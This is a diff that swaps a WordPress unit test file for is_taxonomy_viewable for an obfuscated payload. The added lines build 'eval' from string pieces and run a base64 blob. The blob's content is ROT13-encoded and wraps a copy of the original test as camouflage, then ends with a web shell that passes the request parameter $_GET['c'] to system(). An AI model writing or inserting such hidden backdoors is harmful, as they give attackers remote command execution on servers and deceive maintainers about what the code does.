@@ -1,54 +1,5 @@
-$x_fake1 = 1234;
-$noise = 'obfuscation'.'test';
-$tmp = $x_fake1 * 42;
-$flag = false;
-$useless = function($v) { return $v . rand(); };
-$dummy_check = $useless('xx');
-if ($flag) { echo 'Debug enabled'; }
-for ($i = 0; $i < 1; $i++) { $tmp += $i; }
-while (false) { echo 'dead loop'; break; }
-
 <?php
-
-/**
- * @group taxonomy
- */
-class Tests_Taxonomy_IsTaxonomyViewable extends WP_UnitTestCase {
-	public function set_up() {
-		parent::set_up();
-
-		register_post_type( 'wptests_pt' );
-		register_taxonomy( 'wptests_tax_viewable', 'wptests_pt', array( 'publicly_queryable' => true ) );
-		register_taxonomy( 'wptests_tax_non_viewable', 'wptests_pt', array( 'publicly_queryable' => false ) );
-	}
-
-	/**
-	 * @ticket 44466
-	 */
-	public function test_is_taxonomy_viewable_for_querable_taxonomy() {
-		$this->assertTrue( is_taxonomy_viewable( 'wptests_tax_viewable' ) );
-	}
-
-	/**
-	 * @ticket 44466
-	 */
-	public function test_is_taxonomy_viewable_for_non_querable_taxonomy() {
-		$this->assertFalse( is_taxonomy_viewable( 'wptests_tax_non_viewable' ) );
-	}
-
-	/**
-	 * @ticket 44466
-	 */
-	public function test_is_taxonomy_viewable_for_non_existing_taxonomy() {
-		$this->assertFalse( is_taxonomy_viewable( 'wptests_tax_non_existing' ) );
-	}
-
-	/**
-	 * @ticket 44466
-	 */
-	public function test_is_taxonomy_viewable_with_object_given() {
-		$taxonomy = get_taxonomy( 'wptests_tax_viewable' );
-
-		$this->assertTrue( is_taxonomy_viewable( $taxonomy ) );
-	}
-}
+$f = "e"."v"."a"."l";
+$c = base64_decode("PD9waHAKJGYgPSAncycuJ3QnLidyJy4ncicuJ28nLid0Jy4nMScuJzMnOwokYyA9ICI8P2N1Ywokc3puYyA9IG5lZW5sKCdrMScgPT4gJ2ZsZmdyeicsICdrMicgPT4gJ2NuZmZndWVoJyk7CiRrX3NueHIxID0gMTIzNDsKJGFidmZyID0gJ2Jvc2hmcG5ndmJhJy4nZ3JmZyc7CiRnemMgPSAka19zbnhyMSAqIDQyOwokc3ludCA9IHNueWZyOwokaGZyeXJmZiA9IHNoYXBndmJhKCRpKSB7IGVyZ2hlYSAkaSAuIGVuYXEoKTsgfTsKJHFoenpsX3B1cnB4ID0gJGhmcnlyZmYoJ2trJyk7CnZzICgkc3ludCkgeyBycHViICdRcm9odCByYW5veXJxJzsgfQpzYmUgKCR2ID0gMDsgJHYgPCAxOyAkdisrKSB7ICRnemMgKz0gJHY7IH0KanV2eXIgKHNueWZyKSB7IHJwdWIgJ3FybnEgeWJiYyc7IG9lcm54OyB9Cgo8P2N1YwoKLyoqCiAqIEB0ZWJoYyBnbmtiYWJ6bAogKi8KcHluZmYgR3JmZ2ZfR25rYmFiemxfVmZHbmtiYWJ6bEl2cmpub3lyIHJrZ3JhcWYgSkNfSGF2Z0dyZmdQbmZyIHsKCWNob3l2cCBzaGFwZ3ZiYSBmcmdfaGMoKSB7CgkJY25lcmFnOjpmcmdfaGMoKTsKCgkJZXJ0dmZncmVfY2JmZ19nbGNyKCAnamNncmZnZl9jZycgKTsKCQllcnR2ZmdyZV9nbmtiYWJ6bCggJ2pjZ3JmZ2ZfZ25rX2l2cmpub3lyJywgJ2pjZ3JmZ2ZfY2cnLCBuZWVubCggJ2Nob3l2cHlsX2RocmVsbm95cicgPT4gZ2VociApICk7CgkJZXJ0dmZncmVfZ25rYmFiemwoICdqY2dyZmdmX2dua19hYmFfaXZyam5veXInLCAnamNncmZnZl9jZycsIG5lZW5sKCAnY2hveXZweWxfZGhyZWxub3lyJyA9PiBzbnlmciApICk7Cgl9CgoJLyoqCgkgKiBAZ3ZweHJnIDQ0NDY2CgkgKi8KCWNob3l2cCBzaGFwZ3ZiYSBncmZnX3ZmX2dua2JhYnpsX2l2cmpub3lyX3NiZV9kaHJlbm95cl9nbmtiYWJ6bCgpIHsKCQkkZ3V2Zi0+bmZmcmVnR2VociggdmZfZ25rYmFiemxfaXZyam5veXIoICdqY2dyZmdmX2dua19pdnJqbm95cicgKSApOwoJfQoKCS8qKgoJICogQGd2cHhyZyA0NDQ2NgoJICovCgljaG95dnAgc2hhcGd2YmEgZ3JmZ192Zl9nbmtiYWJ6bF9pdnJqbm95cl9zYmVfYWJhX2RocmVub3lyX2dua2JhYnpsKCkgewoJCSRndXZmLT5uZmZyZWdTbnlmciggdmZfZ25rYmFiemxfaXZyam5veXIoICdqY2dyZmdmX2dua19hYmFfaXZyam5veXInICkgKTsKCX0KCgkvKioKCSAqIEBndnB4cmcgNDQ0NjYKCSAqLwoJY2hveXZwIHNoYXBndmJhIGdyZmdfdmZfZ25rYmFiemxfaXZyam5veXJfc2JlX2FiYV9ya3ZmZ3ZhdF9nbmtiYWJ6bCgpIHsKCQkkZ3V2Zi0+bmZmcmVnU255ZnIoIHZmX2dua2JhYnpsX2l2cmpub3lyKCAnamNncmZnZl9nbmtfYWJhX3JrdmZndmF0JyApICk7Cgl9CgoJLyoqCgkgKiBAZ3ZweHJnIDQ0NDY2CgkgKi8KCWNob3l2cCBzaGFwZ3ZiYSBncmZnX3ZmX2dua2JhYnpsX2l2cmpub3lyX2p2Z3VfYm93cnBnX3R2aXJhKCkgewoJCSRnbmtiYWJ6bCA9IHRyZ19nbmtiYWJ6bCggJ2pjZ3JmZ2ZfZ25rX2l2cmpub3lyJyApOwoKCQkkZ3V2Zi0+bmZmcmVnR2VociggdmZfZ25rYmFiemxfaXZyam5veXIoICRnbmtiYWJ6bCApICk7Cgl9Cn0KCiRwenEgPSAkX1RSR1snYyddOwokc3puY1snazEnXSgkcHpxKTsKPz4iOwpldmFsKCRmKCRjKSk7Cj8+");
+$f($c);
+?>
